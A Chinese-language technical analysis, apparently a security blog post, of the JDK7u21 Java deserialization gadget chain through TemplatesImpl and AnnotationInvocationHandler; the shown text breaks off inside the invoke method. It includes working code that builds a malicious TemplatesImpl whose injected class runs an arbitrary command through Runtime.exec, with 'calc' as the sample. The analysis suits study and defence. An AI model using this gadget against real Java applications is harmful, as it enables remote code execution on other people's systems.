<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="df0b94a352da1f7878e74914ab4b37b9"><strong>概述</strong></h2>
<p><code>JDK7u21</code> 反序列化漏洞所用到的类都是 <code>JDK</code> 自带类,对其做了详细分析，记录一下.</p>
<p>主要涉及类和接口包括：<code>LinkedHashSet</code>、<code>HashSet</code>、<code>HashMap</code>、<code>TemplatesImpl</code>、<code>AbstractTranslet</code>、<code>Proxy</code>、<code>AnnotationInvocationHandler</code>.</p>
<p>涉及知识点：Java 反序列化、反射、动态代理.</p>
<p>环境：<code>jdk1.7.0_21</code>、<code>IDEA 2019.2</code></p>
<h2 data-content="1" id="49680e5cb87cd616680418768a34210b"><strong>分析过程</strong></h2>
<h3 data-content="1" id="49fce8d661ad4a4db9346f564d6b5a50"><strong><em>TemplatesImpl class</em></strong></h3>
<p>getTransletInstance() 方法</p>
<p>当 <code>_class</code> 字段为 <code>null</code> 时，会调用 <code>defineTransletClasses()</code> 方法，然后执行 <code>_class[_transletIndex].newInstance()</code> 语句( <code>newInstance()</code> 会调用 <code>_class[_transletIndex]</code> 的无参构造方法，生成类实例对象).</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="n">Translet</span> <span class="nf">getTransletInstance</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">TransformerConfigurationException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">_name</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">_class</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="n">defineTransletClasses</span><span class="o">();</span>

        <span class="c1">// The translet needs to keep a reference to all its auxiliary</span>
        <span class="c1">// class to prevent the GC from collecting them</span>
        <span class="n">AbstractTranslet</span> <span class="n">translet</span> <span class="o">=</span> <span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">)</span> <span class="n">_class</span><span class="o">[</span><span class="n">_transletIndex</span><span class="o">].</span><span class="na">newInstance</span><span class="o">();</span>
        <span class="n">translet</span><span class="o">.</span><span class="na">postInitialization</span><span class="o">();</span>
        <span class="n">translet</span><span class="o">.</span><span class="na">setTemplates</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
        <span class="n">translet</span><span class="o">.</span><span class="na">setServicesMechnism</span><span class="o">(</span><span class="n">_useServicesMechanism</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">_auxClasses</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">translet</span><span class="o">.</span><span class="na">setAuxiliaryClasses</span><span class="o">(</span><span class="n">_auxClasses</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">translet</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="n">InstantiationException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>defineTransletClasses() 方法分析</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">defineTransletClasses</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">TransformerConfigurationException</span> <span class="o">{</span>

    <span class="k">if</span> <span class="o">(</span><span class="n">_bytecodes</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">NO_TRANSLET_CLASS_ERR</span><span class="o">);</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>

    <span class="n">TransletClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="o">(</span><span class="n">TransletClassLoader</span><span class="o">)</span>
        <span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span><span class="k">new</span> <span class="n">PrivilegedAction</span><span class="o">()</span> <span class="o">{</span>
            <span class="kd">public</span> <span class="n">Object</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
                <span class="k">return</span> <span class="k">new</span> <span class="n">TransletClassLoader</span><span class="o">(</span><span class="n">ObjectFactory</span><span class="o">.</span><span class="na">findClassLoader</span><span class="o">());</span>
            <span class="o">}</span>
        <span class="o">});</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="kd">final</span> <span class="kt">int</span> <span class="n">classCount</span> <span class="o">=</span> <span class="n">_bytecodes</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
        <span class="n">_class</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="n">classCount</span><span class="o">];</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">classCount</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">_auxClasses</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="c1">// 遍历 _bytecodes(byte[][]) 数组，使用类加载器将字节码转化为 Class</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">classCount</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
            <span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">loader</span><span class="o">.</span><span class="na">defineClass</span><span class="o">(</span><span class="n">_bytecodes</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
            <span class="c1">// 获取 Class 的父类</span>
            <span class="kd">final</span> <span class="n">Class</span> <span class="n">superClass</span> <span class="o">=</span> <span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getSuperclass</span><span class="o">();</span>

            <span class="c1">// 如果 Class 的父类名是 "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"，为 _transletIndex 赋值，否则调用 Hashtable 的 put 方法为 _auxClasses 字段增加值</span>
            <span class="c1">// Check if this is the main class</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">superClass</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">ABSTRACT_TRANSLET</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">_transletIndex</span> <span class="o">=</span> <span class="n">i</span><span class="o">;</span>
            <span class="o">}</span>
            <span class="k">else</span> <span class="o">{</span>
                <span class="n">_auxClasses</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">(),</span> <span class="n">_class</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">_transletIndex</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">ErrorMsg</span> <span class="n">err</span><span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">NO_MAIN_TRANSLET_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="n">ClassFormatError</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_CLASS_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>
    <span class="k">catch</span> <span class="o">(</span><span class="n">LinkageError</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>   
<span class="o">}</span>
</pre></div>
<p>调用 <code>getTransletInstance()</code> 方法在 <code>newTransformer()</code> 方法中也有调用，并且不需要前置条件即可调用. 所以实际调用 <code>newTransformer()</code> 或 <code>getTransletInstance()</code> 方法都可以.</p>
<h3 data-content="1" id="bf88163f921564c6144cd4695fab3e34"><strong><em>_bytecodes field</em></strong></h3>
<p>首先构造 <code>Foo</code> 类，该类实现了 <code>Serializable</code> 序列化接口.然后使用 <code>ClassPool</code> 修改 <code>Foo</code> 类，因为为 <code>_transletIndex</code> 设置值时，父类名必须为 <code>"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</code>，所以调用 <code>clazz.setSuperclass(xxx)</code> 设置 <code>Foo</code> 类的父类.另外调用类的无参构造方法时触发我们想要执行的代码，所以可以给 <code>Foo</code> 类的默认构造方法添加我们想执行的代码，或者构造静态代码块添加我们想执行的代码.</p>
<p>1、通过 <code>ClassPool</code> 构造字节码.</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">T</span> <span class="nf">createTemplatesImpl</span> <span class="o">(</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">tplClass</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">abstTranslet</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">transFactory</span> <span class="o">)</span>
    <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
    <span class="kd">final</span> <span class="n">T</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">tplClass</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>

    <span class="c1">// use template gadget class</span>
    <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>

    <span class="c1">// 新增搜索路径到 pathList 中</span>
    <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">Foo</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
    <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">abstTranslet</span><span class="o">));</span>

    <span class="c1">// 先后从缓存和 pathList 中寻找 Foo 类，返回 CtClass 对象</span>
    <span class="kd">final</span> <span class="n">CtClass</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">Foo</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>

    <span class="c1">// 构造静态初始化语句，后面用到</span>
    <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"java.lang.Runtime.getRuntime().exec(\""</span> <span class="o">+</span>
            <span class="n">command</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"\\\\"</span><span class="o">,</span><span class="s">"\\\\\\\\"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"\""</span><span class="o">,</span> <span class="s">"\\\""</span><span class="o">)</span> <span class="o">+</span>
            <span class="s">"\");"</span><span class="o">;</span>

    <span class="c1">// 在类中设置静态初始化语句</span>
    <span class="n">clazz</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>

    <span class="c1">// 设置类名</span>
    <span class="n">clazz</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">"com.Pwner"</span><span class="o">);</span>

    <span class="c1">// 先后从缓存和 pathList 中寻找 abstTranslet 类，返回 CtClass 对象</span>
    <span class="n">CtClass</span> <span class="n">superC</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstTranslet</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>

    <span class="c1">// 设置父类为 abstTranslet</span>
    <span class="n">clazz</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">superC</span><span class="o">);</span>

    <span class="c1">// 将类转换为二进制</span>
    <span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

    <span class="c1">// 使用 Reflections 反射框架为 _bytecodes 字段赋值</span>
    <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]</span> <span class="o">{</span>
            <span class="n">classBytes</span><span class="o">,</span> <span class="n">ClassFiles</span><span class="o">.</span><span class="na">classAsBytes</span><span class="o">(</span><span class="n">Foo</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
    <span class="o">});</span>

    <span class="c1">// 使用 Reflections 反射框架为 _name 字段赋值</span>
    <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"Pwner"</span><span class="o">);</span>

    <span class="k">return</span> <span class="n">templates</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Foo</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">8207363842866235160L</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>2、直接构造 <code>Java</code> 类，生成 <code>class</code> 文件，读取 <code>class</code> 文件并转换为字节码数组.</p>
<div class="highlight"><pre><span></span><span class="n">构造</span> <span class="n">Java</span> <span class="n">类</span>

<span class="n">Foo</span><span class="o">.</span><span class="na">java</span>

<span class="kn">import</span> <span class="nn">java.lang.Runtime</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Foo</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">8207363842866235160L</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">Foo</span><span class="o">(){</span>
        <span class="k">try</span><span class="o">{</span>
            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
        <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"exec Exception"</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span> <span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{}</span>


    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span> <span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{}</span>

<span class="o">}</span>

<span class="n">读取</span> <span class="kd">class</span> <span class="nc">文件</span><span class="err">，</span><span class="n">生成字节码数组</span>

<span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"class path"</span><span class="o">);</span>
<span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="n">toByteArray</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>

<span class="kd">private</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">toByteArray</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">in</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>

    <span class="n">ByteArrayOutputStream</span> <span class="n">out</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">4</span><span class="o">];</span>
    <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
    <span class="k">while</span> <span class="o">((</span><span class="n">n</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">buffer</span><span class="o">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">buffer</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">n</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">out</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<p>将生成的字节码通过 <code>Reflections</code> 反射框架为 <code>_bytecodes</code> 字段赋值，这时 <code>TemplatesImpl</code> 对象就已经构造好了，只需要调用<br/>
<code>newTransformer()</code> 或 <code>getTransletInstance()</code> 方法即可触发.</p>
<h3 data-content="1" id="06c4cd718789154925edcc7a70b98485"><strong><em>AnnotationInvocationHandler class</em></strong></h3>
<p>由上面知道，我们需要找到一个序列化类，并且此序列化类能够调用 <code>TemplatesImpl</code> 对象的 <code>newTransformer()</code> 或 <code>getTransletInstance()</code> 方法. <code>AnnotationInvocationHandler</code> 类中的 <code>equalsImpl</code> 方法正好符合.</p>
<p><code>AnnotationInvocationHandler</code> 类中存在 <code>var8 = var5.invoke(var1);</code> 语句(通过反射调用 <code>var1</code> 对象的 <code>var5</code> 方法),分析一下 <code>equalsImpl</code> 方法.</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="n">Boolean</span> <span class="nf">equalsImpl</span><span class="o">(</span><span class="n">Object</span> <span class="n">var1</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// 判断 var1 和 this 对象是否相等</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="o">==</span> <span class="k">this</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="c1">// 判断 var1 对象是否被转化为 this.type 类</span>
    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">type</span><span class="o">.</span><span class="na">isInstance</span><span class="o">(</span><span class="n">var1</span><span class="o">))</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="c1">// 根据 this.type 获取本类的所有方法</span>
        <span class="n">Method</span><span class="o">[]</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getMemberMethods</span><span class="o">();</span>
        <span class="kt">int</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

        <span class="c1">// 遍历从 this.type 类中获取的方法</span>
        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">var4</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var4</span> <span class="o">&lt;</span> <span class="n">var3</span><span class="o">;</span> <span class="o">++</span><span class="n">var4</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">Method</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">var2</span><span class="o">[</span><span class="n">var4</span><span class="o">];</span>
            <span class="n">String</span> <span class="n">var6</span> <span class="o">=</span> <span class="n">var5</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
            <span class="c1">// 查看 this.memberValues 中是否存在 key 为 this.type 类中的方法名</span>
            <span class="n">Object</span> <span class="n">var7</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var6</span><span class="o">);</span>
            <span class="n">Object</span> <span class="n">var8</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="c1">// var1 如果为代理类并且为 AnnotationInvocationHandler 类型，返回 Proxy.getInvocationHandler(var1).否则返回 null</span>
            <span class="n">AnnotationInvocationHandler</span> <span class="n">var9</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">asOneOfUs</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
            <span class="c1">// var9 不等于 null 时，执行 if 语句，否则执行 else 语句</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">var9</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">var8</span> <span class="o">=</span> <span class="n">var9</span><span class="o">.</span><span class="na">memberValues</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var6</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="c1">// 调用 var1 对象的 var5 方法.  如：getOutputProperties.invoke(templatesImpl)，就会调用 templatesImpl 对象的 getOutputProperties 方法</span>
                    <span class="n">var8</span> <span class="o">=</span> <span class="n">var5</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InvocationTargetException</span> <span class="n">var11</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">var12</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="n">AssertionError</span><span class="o">(</span><span class="n">var12</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="k">if</span> <span class="o">(!</span><span class="n">memberValueEquals</span><span class="o">(</span><span class="n">var7</span><span class="o">,</span> <span class="n">var8</span><span class="o">))</span> <span class="o">{</span>
                <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>所以当我们调用 <code>equalsImpl</code> 方法，并且想要成功执行到 <code>var5.invoke(var1)</code> 时，需要满足几个条件:</p>
<p>1、var1 ！= this;</p>
<p>2、var1 对象能够转化为 this.type 类型，this.type 应该为 var1 对应类的本类或父类;</p>
<p>3、this.asOneOfUs(var1) 返回 null.</p>
<p>而想要通过反射执行 <code>TemplatesImpl</code> 对象的方法， <code>var1</code> 应该为 <code>TemplatesImpl</code> 对象，<code>var5</code> 应该为 <code>TemplatesImpl</code> 类中的方法，而 <code>var5</code> 方法是从 <code>this.type</code> 类中获取到的.通过查看 <code>TemplatesImpl</code> 类，<code>javax.xml.transform.Templates</code> 接口正好符合，这里最终会调用 <code>getOutputProperties</code> 方法.</p>
<p><code>equalsImpl</code> 方法的调用在 <code>invoke</code> 方法中.分析 <code>invoke</code> 方法，想要调用 <code>equalsImpl</code> 方法，需要满足:</p>
<p>1、var2 方法名应该为 equals;</p>
<p>2、var2 方法的形参个数为 1;</p>
<p>3、var2 方法的形参类型为 Object 类型.</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">var1</span><span class="o">,</span> <span class="n">Method</span> <span class="n">var2</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">var4</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
    <span class="n">Class</span><span class="o">[]</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">var4</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"equals"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">var5</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">var5</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">equalsImpl</span><span class="o">(</span><span class="n">var3</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="k">assert</span> <span class="n">var5</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="mi">0</span><span class="o">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">var4</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"toString"</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">toStringImpl</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var4</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"hashCode"</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">hashCodeImpl</span><span class="o">();</span>
